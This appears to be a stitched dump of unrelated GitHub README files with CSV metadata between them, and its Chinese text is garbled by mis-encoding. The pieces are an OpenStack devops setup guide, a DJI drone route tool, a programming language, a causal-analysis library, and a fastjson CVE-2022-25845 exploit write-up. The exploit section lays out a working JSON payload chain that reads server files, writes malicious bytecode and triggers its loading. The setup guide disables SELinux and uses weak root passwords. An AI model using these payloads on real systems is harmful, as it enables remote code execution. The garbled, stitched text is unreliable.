$ curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo
$ sed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo
$ yum makecache

# ÂÖ≥Èó≠Èò≤ÁÅ´Â¢ô
$ systemctl stop network
$ systemctl disable network

# Á¶ÅÁî®selinux
$ sed -i 's#^SELINUX=.*#SELINUX=disabled#g' /etc/selinux/config
$ reboot

# ÂÆâË£Ödocker
$ yum -y install docker-ce
$ systemctl start docker
$ systemctl enable docker
```

- ËøêË°åMySQL

```shell
# ËøêË°åÂÆπÂô®
$ docker run --name mysql -p 3306:3306 -d -e MYSQL_ROOT_PASSWORD=123456 -e TZ=Asia/Shanghai -v /opt/data/mysql:/var/lib/mysql mysql:8.0 --lower_case_table_names=1
```

- ËøêË°åRedis

```shell
$ docker run --name redis -p 6379:6379 -d -e TZ=Asia/Shanghai redis
```

- ÂÆâË£ÖJava

```shell
$ yum -y install java-1.8.0-openjdk
```

### 2.3 ÂáÜÂ§áÂºÄÂèëÁéØÂ¢É

Êú¨‰∫∫‰ΩøÁî®MacbookÔºå‰ª•MacbookÊèèËø∞ÂºÄÂèëÁéØÂ¢ÉÂáÜÂ§áÊ≠•È™§

- ÂÆâË£Ö`jdk1.8`
- ÂÆâË£Ö`nvm` Ê≥®Ôºö`nvm`ÊòØ`nodejs`Ê°ÜÊû∂ÁöÑÁÆ°ÁêÜÂô®

```sh
# ÂÆâË£Önvm
$ brew install nvm

# Ê∑ªÂä†ÁéØÂ¢ÉÂèòÈáè
$ vi ~/.zshrc 
export NVM_DIR=""$HOME/.nvm""
# Ë∑ØÂæÑÂèØËÉΩÈúÄË¶ÅÊ†πÊçÆÊÇ®ÂÆûÈôÖÁöÑHomebrewÂÆâË£Ö‰ΩçÁΩÆËøõË°åË∞ÉÊï¥
[ -s ""/opt/homebrew/opt/nvm/nvm.sh"" ] && \. ""/opt/homebrew/opt/nvm/nvm.sh""
[ -s ""/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm"" ] && \. ""/opt/homebrew/opt/nvm/etc/bash_completion.d/nvm""

# ÁîüÊïà
$ source ~/.zshrc

# ÊµãËØï
$ nvm --versio
```

- ‰ΩøÁî®`nvm`ÂÆâË£Önodejs v14.18.2 ÁâàÊú¨

```shell
$ nvm install v14.18.2
```

- ÈÖçÁΩÆÂÖçÂØÜÁôªÂΩïopenstackËäÇÁÇπ

```sh
# ÁîüÂ≠òÂÖ¨Èí•‰∏éÁßÅÈí•ÔºåÂ¶ÇÊûúÊúâÂèØ‰ª•Ë∑≥Ëøá
$ ssh-keygen -t rsa -C ""your_email@example.com"" # ‰πãÂêé‰∏ÄÁõ¥ÂõûËΩ¶

# Â∞ÜÂÖ¨Èí•Â§çÂà∂ÁªôOpenStackËäÇÁÇπ
$ cat ~/.ssh/rsa.pub #Â∞ÜÂÖ∂‰∏≠ÁöÑÂÖ¨Èí•ËøõË°åÂ§çÂà∂
ssh-rsa AAAAB3N*****

# ÁôªÂΩïOpenStackËäÇÁÇπÔºåÂ∞ÜÂ§çÂà∂ÁöÑÂÖ¨Èí•Êã∑Ë¥ùÂà∞OpenStackËäÇÁÇπ
$ ssh root@192.168.105.10
$ echo ""ssh-rsa AAAAB3N*****"" >> ~/.ssh/authorized_keys #Â∞ÜÂ§çÂà∂ÁöÑÂÖ¨Èí•Ê∑ªÂä†ËøõÊù•
$ exit

# ÊµãËØïÂÖçÂØÜÁôªÂΩï
$ ssh root@192.168.105.10
```

<font color='red'>ÈúÄË¶ÅÂÖçÂØÜÁöÑÂéüÂõ†ÔºöÂêéÈù¢‰ºöÂú®SpringBootÊé•Âè£ÂÜÖÈÉ®È©±Âä®ssh ËÆøÈóÆOpenStackÔºåÂπ∂ÊâßË°åOpenStack‰∏≠ÁöÑËøêÁª¥ËÑöÊú¨¬†</font>

- Áî®ideaÂØºÂÖ•`backend/`
- Áî®webstormÂØºÂÖ•`frontend/`
- Â∞Ü `cmd/`ÁõÆÂΩï Êã∑Ë¥ùÂà∞OpenStackËäÇÁÇπÁöÑÊ†πÁõÆÂΩï

```sh
$ scp -r cmd/ root@192.168.105.10:/
# cmdÁõÆÂΩï‰∏≠ÂåÖÂê´ÁöÑÊòØÁºñÂÜôÁöÑËøêÁª¥OpenStackÁöÑËá™ÂÆö‰πâËÑöÊú¨
```

- Áî®navicatÈìæÊé•mysqlÔºåÂú∞ÂùÄ 192.168.105.20:3306ÔºåÂπ∂ÂØºÂÖ•Êèê‰æõÁöÑdevops.sqlÔºåËØ∑‰ΩøÁî®Êó•ÊúüÊúÄÊñ∞ÁöÑËøõË°åÂØºÂÖ•

- Âú®idea‰∏≠ÂêØÂä®ÂêéÁ´ØÈ°πÁõÆ

```yaml
# ‰øÆÊîπapplication.yml
# Ë∑ØÂæÑÔºöneu-admin/src/main/resources/application.yml
carbon:
  profile: /Users/username/Desktop/project/devops/var/uploadPath # ‰øÆÊîπË∑ØÂæÑ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ
  execHost: 192.168.105.10 # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫Âú∞ÂùÄ
  execPort: 22 # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÁöÑÁ´ØÂè£ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫ËøúÁ®ãËÆøÈóÆÁ´ØÂè£
  execUser: root # ÂèëËµ∑LinuxÂëΩ‰ª§ÁöÑÁõÆÊ†á‰∏ªÊú∫ÁöÑÁî®Êà∑ÔºåËøôÈáåËÆæÂÆö‰∏∫OpenStack‰∏ªÊú∫ËøúÁ®ãËÆøÈóÆÁî®Êà∑
server:
  tomcat:
    # Êîπ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ
    basedir: /Users/chengda/Desktop/project/devops/var/temp
    # ËøûÊé•Ë∂ÖÊó∂Êîπ‰∏∫10ÂàÜÈíü
    connection-timeout: 600000
    # ÂéüÂõ†ÔºöÊâßË°åOpenStackËÑöÊú¨ÂêéÔºåÊï∞ÊçÆÁªìÊûúË¶ÅÂõûÂ°´È°πÁõÆÊï∞ÊçÆÂ∫ìÔºåËøôÈúÄË¶Å‰∏ÄÂÆöÁöÑÂìçÂ∫îÊó∂Èó¥ÔºåÁõÆÂâçÊ≤°ÂÅöÂºÇÊ≠•Â§ÑÁêÜ
spring:
  redis:
    # Âú∞ÂùÄ‰∏éÁ´ØÂè£Ôºå
    host: 192.168.105.20
    port: 6379

# ‰øÆÊîπ application-druid.yml
# Ë∑ØÂæÑÔºöneu-admin/src/main/resources/application-druid.yml
spring:
    datasource:
      druid:
    # ‰∏ªÂ∫ìÊï∞ÊçÆÊ∫ê
        master:
            # Êï∞ÊçÆÂ∫ìÈìæÊé•
          url: jdbc:mysql://192.168.105.20:3306/devops?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
          username: root
          password: 123456
```

```xml
<!-- ‰øÆÊîπlogback.xml -->
<!-- Ë∑ØÂæÑÔºöneu-admin/src/main/resources/logback.xml -->
<?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
  <!-- Êó•ÂøóÂ≠òÊîæË∑ØÂæÑÔºåÊîπ‰∏∫Ëá™Â∑±ËÆæÂÆöÁöÑË∑ØÂæÑ -->
	<property name=""log.path"" value=""/Users/username/Desktop/project/devops/var/logs"" />
```

ÂêØÂä®È°πÁõÆ

- Âú®webstorm‰∏≠ÔºåÊâìÂºÄÁªàÁ´ØÔºåÂàáÊç¢Âà∞nodejs v14.18.2ÔºåÂêØÂä®È°πÁõÆ

```sh
# Â∞ÜÂΩìÂâç‰ΩøÁî®ÁöÑnodejs ÂàáÊç¢‰∏∫ v14.18.2
$ nvm use v14.18.2

# ÂÆâË£Ö‰æùËµñ
$ npm i

# ËøêË°å
npm run dev
```

Á≥ªÁªüÊï¥‰ΩìÊû∂ÊûÑÂ¶Ç‰∏ã
<img src='img/framework.png'>

ÊïàÊûúÂ¶Ç‰∏ã

<img src='img/dashboard.png'>

<font color='red'>Ê≥®ÊÑèÔºöÂêéÈù¢ÂêéÂè∞‰ª£Á†ÅÂèòÊõ¥ÂùáÂú®neu-systemÂåÖ‰∏≠ÔºåÂâçÂè∞‰ª£Á†ÅÂèòÊõ¥ÂùáÂú® frontend/src/views/system Ë∑ØÂæÑ‰∏ã¬†</font>

# 3. Ëø≠‰ª£ËÆ∞ÂΩï

- 2024-10-25 ÂÆåÊàêÁßüÊà∑Êñ∞Â¢ûÔºåÁßüÊà∑Âà†Èô§
- 2024-10-27 ÂÆåÊàêÁî®Êà∑Êñ∞Â¢ûÔºåÁî®Êà∑Âà†Èô§
- 2024-11-01 ÂÆåÊàêÁî®Êà∑‰∏éÁßüÊà∑ÁöÑËßíËâ≤ÂÖ≥ËÅî
  - Êï∞ÊçÆÂ∫ìË°®`openstack_project_user`
  - ËÑöÊú¨`openstack-project-user-associate.sh`
- 2024-11-05 ÂÆåÊàêÁî®Êà∑‰∏éÁßüÊà∑ÁöÑËßíËâ≤ÂÖ≥ËÅî
  - ÂâçÁ´Ø 
  - ÂêéÁ´Ø
  - ÂàõÂª∫Êï∞ÊçÆÂ∫ìËÑöÊú¨ devops-2024-11-05.sql
- 2024-11-07 Êñ∞Â¢ûÁßüÊà∑Áî®Êà∑ÁöÑÂÖ≥ËÅîËß£Èô§-ÂÆåÊØï
  - ËÑöÊú¨ `openstack-project-user-disassociate.sh`
  - ÂêéÁ´ØÊé•Âè£ `OpenstackProjectUserController.sh` Â¢ûÂä†Ëß£Èô§ÂÖ≥ËÅîÈÄªËæë

- 2024-11-12 Êñ∞Â¢ûÈïúÂÉèÁÆ°ÁêÜ-Êñ∞Â¢ûÈïúÂÉè-ËÑöÊú¨-Êï∞ÊçÆÂ∫ì-‰Ωé‰ª£Á†Å-Êé•Âè£
  - ËÑöÊú¨ `openstack-image-create.sh`
  - ÂêéÁ´ØÊé•Âè£ `OpenstackImageInfoController.java`
  - ÂâçÁ´ØÈ°µÈù¢-‰Ωé‰ª£Á†ÅÂàùÂßãÂåñÈ°µÈù¢
    - `openstack_image_info.js`
    - `openstack_image_info/index.vue`
  - Êï∞ÊçÆÂ∫ìÊõ¥Êñ∞ `devops-2024-11-12.sql`
- 2024-12-02 Êñ∞Â¢ûÁΩëÁªúÁÆ°ÁêÜ
  - ËÑöÊú¨
  - Êé•Âè£
  - ui
- 2024-12-05 Êñ∞Â¢ûÂ≠êÁΩëÁÆ°ÁêÜ
  - Êï∞ÊçÆÂ∫ìËÑöÊú¨
  - Êé•Âè£
  - ui

- 2024-12-10 ‰øÆÊîπÂ≠êÁΩëÁÆ°ÁêÜÁöÑUIÔºåÊñ∞Â¢ûÁΩëÁªúÁÆ°ÁêÜ -> Â≠êÁΩëÁÆ°ÁêÜÁöÑÈÄªËæë‰∏éUI
  - ui
- 2024-12-12 Êñ∞Â¢ûË∑ØÁî±Âô®ËÑöÊú¨
- 2024-12-16 Êñ∞Â¢ûÂàõÂª∫Ë∑ØÁî±Âô®-Êï∞ÊçÆÂ∫ì-Êé•Âè£-ui
- 2024-12-19 Êñ∞Â¢ûË∑ØÁî±Âô®Êé•Âè£ËÆæÁΩÆ-Êï∞ÊçÆÂ∫ì-Êé•Âè£-ui
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
SongJian-99/dj-uav,main,"[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&pause=1000&color=F70E34&width=435&lines=%E5%A6%82%E6%9E%9C%E8%AF%A5%E9%A1%B9%E7%9B%AE%E5%AF%B9%E4%BD%A0%E6%9C%89%E5%B8%AE%E5%8A%A9%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%AC%A2%E8%BF%8E%E7%82%B9%E4%B8%AA+star+%EF%BC%81)](https://git.io/typing-svg)

## ÂÆûÁé∞ÊïàÊûú
### KMZ Êñá‰ª∂ÁªìÊûÑ
![kmz-01.gif](https://s2.loli.net/2024/11/19/kznUqoeSa7CbBAX.gif)

### template.kml Êñá‰ª∂ÂÜÖÂÆπ
![kmz-02.png](https://s2.loli.net/2024/11/19/tDBySCuWoM3mUpf.png)

## ÁâπÁÇπ
### 1„ÄÅÂº∫Â§ßÁöÑËà™Á∫ø KMZ Êñá‰ª∂ÁîüÊàêÂäüËÉΩ
Âü∫‰∫éÂ§ßÁñÜÊúÄÊñ∞Ëà™Á∫øÊñá‰ª∂Ê†ºÂºèÊ†áÂáÜ v1.11.3 ÁâàÊú¨ÂºÄÂèëÔºåÁîüÊàêÁ¨¶ÂêàÂ§ßÁñÜÊ†áÂáÜÁöÑ KMZ Ëà™Á∫øÊñá‰ª∂ÔºåÂèØÁõ¥Êé•ÂØºÂÖ•Âà∞ DJI Pilot 2 ÊàñÊú∫Âú∫Á≠âÂú∞Èù¢Á´ôËΩØ‰ª∂‰∏≠‰ΩøÁî®„ÄÇ
Áî®Êà∑ÂèØ‰ª•Ê†πÊçÆÂÆûÈôÖÈ£ûË°åÈúÄÊ±ÇÔºåÁÅµÊ¥ªÈÖçÁΩÆÂêÑÁßçËà™Á∫øÂèÇÊï∞ÔºåÂåÖÊã¨Ôºö
* Ëà™Á∫øÁªìÊùüÂä®‰ΩúÔºö Ëá™ÂÆö‰πâËà™Á∫øÈ£ûË°åÁªìÊùüÂêéÊó†‰∫∫Êú∫ÁöÑË°å‰∏∫Ôºà‰æãÂ¶ÇÔºöÊÇ¨ÂÅú„ÄÅËøîËà™„ÄÅÈôçËêΩÔºâ„ÄÇ
* Â§±ÊéßÂä®‰ΩúÔºö ËÆæÁΩÆÊó†‰∫∫Êú∫Âú®Â§±ÂéªÈÅ•Êéß‰ø°Âè∑Êó∂ÁöÑÂ∫îÂØπÊé™ÊñΩÔºà‰æãÂ¶ÇÔºöËá™Âä®ËøîËà™„ÄÅÊÇ¨ÂÅúÔºâ„ÄÇ
* È£ûË°åÈ´òÂ∫¶ÂíåÈÄüÂ∫¶Ôºö Á≤æÁ°ÆÊéßÂà∂Ëà™Á∫øÈ£ûË°åÁöÑÈ´òÂ∫¶ÂíåÈÄüÂ∫¶ÔºåÁ°Æ‰øùÈ£ûË°åÂÆâÂÖ®ÂíåÊïàÁéá„ÄÇ
* Ëà™ÁÇπËΩ¨ÂºØÊ®°ÂºèÔºö ÈÄâÊã©ÂêàÈÄÇÁöÑËΩ¨ÂºØÊñπÂºèÔºà‰æãÂ¶ÇÔºöÁõ¥Á∫øÈ£ûË°å„ÄÅÊõ≤Á∫øÈ£ûË°åÔºâÔºå‰ºòÂåñÈ£ûË°åËΩ®Ëøπ„ÄÇ
* ÂÅèËà™ËßíÊ®°ÂºèÔºö ÊéßÂà∂Êó†‰∫∫Êú∫Âú®Ëà™ÁÇπ‰πãÈó¥ÁöÑÂÅèËà™ËßíÂ∫¶ÔºåÊª°Ë∂≥‰∏çÂêåÁöÑÊãçÊëÑÈúÄÊ±Ç„ÄÇ
* Ëà™ÁÇπÂä®‰ΩúÔºö ‰∏∫ÊØè‰∏™Ëà™ÁÇπÂçïÁã¨ËÆæÁΩÆÂä®‰ΩúÔºå‰æãÂ¶ÇÊãçÁÖß„ÄÅÂΩïÂÉè„ÄÅÊÇ¨ÂÅúÁ≠âÔºåÂÆûÁé∞Â§çÊùÇÁöÑÈ£ûË°å‰ªªÂä°„ÄÇ
 
### 2„ÄÅ‰æøÊç∑ÁöÑËà™Á∫ø KMZ Êñá‰ª∂Ëß£ÊûêÂäüËÉΩ
ÊîØÊåÅËß£ÊûêÂ∑≤ÊúâÁöÑ KMZ Ëà™Á∫øÊñá‰ª∂ÔºåÊñπ‰æøÁî®Êà∑ÂØºÂÖ•„ÄÅÊü•ÁúãÂíåÁºñËæëËà™Á∫øÊï∞ÊçÆÔºåÊèêÈ´òËà™Á∫øÁÆ°ÁêÜÁöÑÊïàÁéáÂíåÁÅµÊ¥ªÊÄß„ÄÇ
### 3„ÄÅÊòì‰∫é‰ΩøÁî®ÂíåÊâ©Â±ï
Êèê‰æõÁªìÊûÑÊ∏ÖÊô∞„ÄÅÊ≥®ÈáäÂÆåÂñÑÂÆåÊï¥ÁöÑ Demo ‰ª£Á†ÅÔºåÂ∏ÆÂä©Áî®Êà∑Âø´ÈÄü‰∏äÊâãÔºåËøõË°å‰∫åÊ¨°ÂºÄÂèë„ÄÇ

## ÁõÆÂΩïÁªìÊûÑ
* file/kmzÔºöÂ≠òÊîæÁîüÊàêÁöÑ KMZ Êñá‰ª∂
* domain/kmlÔºöXStream Ê≥®Ëß£ÁöÑ Java Bean
* domain/*.ReqÔºöÂâçÁ´ØËØ∑Ê±ÇÂèÇÊï∞ÂØπË±°
* enumsÔºöËà™Á∫øÊñá‰ª∂ÂÖÉÁ¥†Ê†áÁ≠æÂèñÂÄºÊûö‰∏æ
* util/RouteFileUtilsÔºöÁîüÊàêÂíåËß£Êûê KMZ Ëà™Á∫øÊñá‰ª∂ÁöÑ‰ª£Á†ÅÈÉΩÂú®Ëøô‰∏™Â∑•ÂÖ∑Á±ªÈáå



## Êé•Âè£ÂèÇÊï∞Á§∫‰æã
### ÁîüÊàêËà™Á∫ø KMZ Êñá‰ª∂
```json
{
  ""droneType"": 89,
  ""payloadType"": 81,
  ""payloadPosition"": 0,
  ""imageFormat"": ""ir,zoom"",
  ""finishAction"": ""goHome"",
  ""exitOnRcLostAction"": ""goBack"",
  ""globalHeight"": 100,
  ""autoFlightSpeed"": 10,
  ""waypointHeadingReq"": {
    ""waypointHeadingMode"": ""followWayline""
  },
  ""waypointTurnReq"": {
    ""waypointTurnMode"": ""toPointAndStopWithDiscontinuityCurvature""
  },
  ""gimbalPitchMode"": ""usePointSetting"",
  ""routePointList"": [
    {
      ""routePointIndex"": 1,
      ""longitude"": 123.45,
      ""latitude"": 34.56,
      ""actions"": [
        {
          ""actionIndex"": 1,
          ""hoverTime"": 10
        },
        {
          ""actionIndex"": 2,
          ""zoom"": 20
        }
      ]
    },
    {
      ""routePointIndex"": 2,
      ""longitude"": 123.45,
      ""latitude"": 34.56
    },
    {
      ""routePointIndex"": 3,
      ""longitude"": 123.45,
      ""latitude"": 34.56
    }
  ]
}


```
### ÁºñËæëËà™Á∫ø KMZ Êñá‰ª∂
```json
{
  ""finishAction"": ""autoLand"",
  ""exitOnRcLostAction"": ""landing"",
  ""routePointList"": [
    {
      ""routePointIndex"": 1,
      ""longitude"": 123.45,
      ""latitude"": 34.56,
      ""actions"": [
        {
          ""actionIndex"": 1,
          ""hoverTime"": 10
        },
        {
          ""actionIndex"": 2,
          ""zoom"": 20
        }
      ]
    },
    {
      ""routePointIndex"": 2,
      ""longitude"": 123.45,
      ""latitude"": 34.56
    },
    {
      ""routePointIndex"": 3,
      ""longitude"": 123.45,
      ""latitude"": 34.56,
      ""actions"": [
        {
          ""actionIndex"": 1,
          ""hoverTime"": 10
        },
        {
          ""actionIndex"": 2,
          ""zoom"": 30
        }
      ]
    }
  ]
}
```

## ËÆ°Âàí
1. ÊîØÊåÅÁîüÊàêÂíåËß£ÊûêÂª∫ÂõæËà™Êãç„ÄÅÂÄæÊñúÊëÑÂΩ±„ÄÅËà™Â∏¶È£ûË°åÊ®°ÊùøÁ±ªÂûãÁöÑ KMZ Êñá‰ª∂„ÄÇ

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=SongJian-99/dj-uav&type=Date)](https://star-history.com/#SongJian-99/dj-uav&Date)
",0,2,2,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
luelueking/CVE-2022-25845-In-Spring,main,"# CVE-2022-25845-In-Spring

# ‰∏ªË¶Å‰æùËµñ
1. jackson
2. commons-io

# Âø´ÈÄüÂ§çÁé∞

1. ideaÂØºÂÖ•È°πÁõÆ build ```mvn install```
2. Dockerfile build && run ```docker build .```
3. ËøêË°åsrc/test/java/POC.java ÊâßË°åtouch /tmp/pwnedÂëΩ‰ª§


# Âà©Áî®ËØ¥Êòé

## Step1: Êääjava.io.InputStream Âä†ÂÖ• fastjson autotype ÁºìÂ≠ò

```json
{
  ""a"": ""{    \""@type\"": \""java.lang.Exception\"",    \""@type\"": \""com.fasterxml.jackson.core.exc.InputCoercionException\"",    \""p\"": {    }  }"",
  ""b"": {
    ""$ref"": ""$.a.a""
  },
  ""c"": ""{  \""@type\"": \""com.fasterxml.jackson.core.JsonParser\"",  \""@type\"": \""com.fasterxml.jackson.core.json.UTF8StreamJsonParser\"",  \""in\"": {}}"",
  ""d"": {
    ""$ref"": ""$.c.c""
  }
}
```

![Êà™Â±è2024-11-07 21.36.27](images/%E6%88%AA%E5%B1%8F2024-11-07%2021.36.27.png)

## Step2: fileÂçèËÆÆËØªÂèñ/tmpÂÜÖÂÆπÔºåËé∑ÂèñtomcatÁöÑdocbaseÊñá‰ª∂ÂêçÁß∞

> ÈÄêÂ≠óËäÇËØªÂèñÂÜÖÂÆπ

```json
{
  ""a"": {
    ""@type"": ""java.io.InputStream"",
    ""@type"": ""org.apache.commons.io.input.BOMInputStream"",
    ""delegate"": {
      ""@type"": ""org.apache.commons.io.input.BOMInputStream"",
      ""delegate"": {
        ""@type"": ""org.apache.commons.io.input.ReaderInputStream"",
        ""reader"": {
          ""@type"": ""jdk.nashorn.api.scripting.URLReader"",
          ""url"": ""${file}""
        },
        ""charsetName"": ""UTF-8"",
        ""bufferSize"": ""1024""
      },
      ""boms"": [
        {
          ""charsetName"": ""UTF-8"",
          ""bytes"": ${data}
        }
      ]
    },
    ""boms"": [
      {
        ""charsetName"": ""UTF-8"",
        ""bytes"": [1]
      }
    ]
  },
  ""b"": {""$ref"":""$.a.delegate""}
}
```

![Êà™Â±è2024-11-07 21.35.56](images/%E6%88%AA%E5%B1%8F2024-11-07%2021.35.56.png)

## Step3: ÂÜôÂÖ•ÊÅ∂ÊÑèÂ≠óËäÇÁ†ÅÂà∞docbaseÁõÆÂΩï‰∏ã

```json
{
  ""a"": {
    ""@type"": ""java.io.InputStream"",
    ""@type"": ""org.apache.commons.io.input.AutoCloseInputStream"",
    ""in"": {
      ""@type"": ""org.apache.commons.io.input.TeeInputStream"",
      ""input"": {
        ""@type"": ""org.apache.commons.io.input.CharSequenceInputStream"",
        ""cs"": {
          ""@type"": ""java.lang.String""
          ""${shellcode}"",
          ""charset"": ""iso-8859-1"",
          ""bufferSize"": ${size}
        },
        ""branch"": {
          ""@type"": ""org.apache.commons.io.output.WriterOutputStream"",
          ""writer"": {
            ""@type"": ""org.apache.commons.io.output.LockableFileWriter"",
            ""file"": ""${file2write}"",
            ""charset"": ""iso-8859-1"",
            ""append"": true
          },
          ""charset"": ""iso-8859-1"",
          ""bufferSize"": 1024,
          ""writeImmediately"": true
        },
        ""closeBranch"": true
      }
    },
    ""b"": {
      ""@type"": ""java.io.InputStream"",
      ""@type"": ""org.apache.commons.io.input.ReaderInputStream"",
      ""reader"": {
        ""@type"": ""org.apache.commons.io.input.XmlStreamReader"",
        ""inputStream"": {
          ""$ref"": ""$.a""
        },
        ""httpContentType"": ""text/xml"",
        ""lenient"": false,
        ""defaultEncoding"": ""iso-8859-1""
      },
      ""charsetName"": ""iso-8859-1"",
      ""bufferSize"": 1024
    },
    ""c"": {}
  }
```

![Êà™Â±è2024-11-07 21.37.04](images/%E6%88%AA%E5%B1%8F2024-11-07%2021.37.04.png)

## Step4: Ëß¶ÂèëÊÅ∂ÊÑèÁ±ªÂä†ËΩΩ

```json
{
  ""@type"":""java.lang.Exception"",
  ""@type"":""com.chenzai.HackException""
}
```

![Êà™Â±è2024-11-07 21.35.32](images/%E6%88%AA%E5%B1%8F2024-11-07%2021.35.32.png)

# ÂèÇËÄÉ/Ëá¥Ë∞¢

- [GeekCon 2024](https://www.geekcon.top/js/pdfjs/web/viewer.html?file=/doc/ppt/GC24_SpringBoot‰πãÊÆá.pdf)
- jsjcw

",0,1,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
niccellular/baretoot,main,"# ATAK Plugin Bare Toot

This plugin leverages Digi's XBee Android Library to communicate between an ATAK EUD and a XBee RF Module connected over USB.
",1,0,1,GPL-3.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,56.0
IxionLang/Ixion,main,"<div align=""center"">
  <img src=""https://github.com/IxionLang/Ixion/blob/main/assets/icon.png"" width=""200"">

<h1>The Ixion Programming Language</h1>
Multi-paradigm compiled programming language for the jvm platform.
</div>


> [!IMPORTANT]
> Before installing the language, install jdk.

Hello World in Ixion:
```scala
def main => println(""Hello World"");
```
or:

```scala
def main(args: String[]) {
   println(""Hello World"");
}
```

> [!NOTE]
> The language contains nullable types and non-nullable types.

```scala
def main(args: String[]) {
   var a : String?;
   var b : String = ""Hello"";
}
```

java ArrayList example:

```scala
using java.util.ArrayList;

def main(args: String[]){
    var list = new ArrayList();

    list.add(""Hello"");
    list.add(""World"");

    for(var i = 0; i < list.size(); i++){
        println(list.get(i));
    }
}
```

> [!NOTE]
> The language supports OOP.

Inheritance example:

```scala
class Human {
   var name: String = """";

   this(name: String) {
      this.name = name;
   }
   override def toString => ""My name is "" + name + ""."";

}

class Man ext Human {
    var age : int;

    this(age: int) : (""Artyom"") {
       this.age = age;
    }

    override def toString: String {
        var name : String = super.toString();
        return name + "" My age is "" + age + ""."";
    }

}

def main {
   var simpleMan: Human = new Man(16);
   println(simpleMan);
}
```

## Contributions
We will review and help with all reasonable pull requests as long as the guidelines below are met.

- The license header must be applied to all java source code files.
- IDE or system-related files should be added to the .gitignore, never committed in pull requests.
- In general, check existing code to make sure your code matches relatively close to the code already in the project.
- Favour readability over compactness.
- If you need help, check out the [Google Java Style Guide](https://google.github.io/styleguide/javaguide.html) for a reference.",0,0,1,MIT,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
algorithm-tools/CausalAnalysis,main,"# CausalAnalysis

[![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg?style=socialflat-square&)](https://www.apache.org/licenses/LICENSE-2.0.html)
[![Total Lines](https://img.shields.io/github/stars/algorithm-tools/CausalAnalysis?style=socialflat-square&label=stars)](https://github.com/algorithm-tools/CausalAnalysis/stargazers)
[![CN doc](https://img.shields.io/badge/ÊñáÊ°£-‰∏≠ÊñáÁâà-blue.svg?style=socialflat-square&)](README_zh_CN.md)
[![EN doc](https://img.shields.io/badge/document-English-blue.svg?style=socialflat-square&)](README.md)


# Introduction
Algorithmic implementation of indicators contribution analysis, causal inference using Java. Helps to quickly find the root cause of indicators

# Feature

Its main feature are as follows:

**Supported**:
- Rapid localisation of the root cause dimension by JS scatter calculation.
- Supports quadratic contribution disaggregation of metrics to quickly locate key factors.

**Plan**:
- relevance analysis.
- causal inference.

# Demos
- [CausalAnalysis-Demos](https://github.com/algorithm-tools/CausalAnalysis/tree/main/src/test/java/org/algorithmtools/ca4j/example)

# For Developers
## Using ad4j
- add to maven pom:
```xml
<dependency>
    <groupId>org.algorithmtools</groupId>
    <artifactId>ca4j</artifactId>
    <version>${version}</version>
    <scope>system</scope>
    <systemPath>${project.basedir}/lib/ca4j-${version}.jar</systemPath>
</dependency>

```

- business use:
  Example of the test module under the example package
```java
public class ContributionAnalysisExample {

  public static void main(String[] args) {
    // 1. Transfer biz data to indicator series info
    long currentTime = System.currentTimeMillis();
    List<IndicatorSeries> indicatorSeriesX0 = Arrays.asList(new IndicatorSeries(currentTime - 86400000 + 1, 1, ""A"")
            , new IndicatorSeries(currentTime - 86400000 + 2, 2, ""B"")
            , new IndicatorSeries(currentTime - 86400000 + 3, 3, ""C"")
            , new IndicatorSeries(currentTime - 86400000 + 4, 6, ""D"")
            , new IndicatorSeries(currentTime - 86400000 + 5, 5, ""E"")
    );
    List<IndicatorSeries> indicatorSeriesX1 = Arrays.asList(new IndicatorSeries(currentTime + 1, 1, ""A"")
            , new IndicatorSeries(currentTime + 2, 1.5, ""B"")
            , new IndicatorSeries(currentTime + 3, 3, ""C"")
            , new IndicatorSeries(currentTime + 4, 8, ""D"")
            , new IndicatorSeries(currentTime + 5, 3, ""E"")
    );
    IndicatorPairSeries series = new IndicatorPairSeries(""i-1"", ""i-1-name"", IndicatorStatType.Unique_Continuity, indicatorSeriesX1, indicatorSeriesX0);

    // 2. Get a PlusContributionAnalysisEngin object
    // PlusContributionAnalysisEngin the calculation of contributions to indicators of the additive/subtractive type.
    // MultiplyContributionAnalysisEngin the calculation of the contribution of indicators to the multiplication type.
    // DivisionContributionAnalysisEngin the calculation of the contribution to the indicators of division type
    PlusContributionAnalysisEngin engin = new PlusContributionAnalysisEngin(CausalAnalysisContext.createDefault());

    // 3. analyse
    ContributionResult result = engin.analyse(series);

    // 4. Business process analysis result. Like Records,Alarms,Print,Deep analysis...
    System.out.println(result);
  }

}
```
Print result:
```text
Overview:17.0-->16.5	ChangeValue(-0.5)	ChangeRate(-0.029411764705882353)
FactorTermContribution:
FactorTerm:A	1.0-->1.0	ChangeValue(ChangeRate):0.0(0.0)	ContributionValue(ContributionRate):0.0(0.0)	 ContributionProportion:0.0
FactorTerm:B	2.0-->1.5	ChangeValue(ChangeRate):-0.5(-0.25)	ContributionValue(ContributionRate):-0.5(-0.029411764705882353)	 ContributionProportion:0.1111111111111111
FactorTerm:C	3.0-->3.0	ChangeValue(ChangeRate):0.0(0.0)	ContributionValue(ContributionRate):0.0(0.0)	 ContributionProportion:0.0
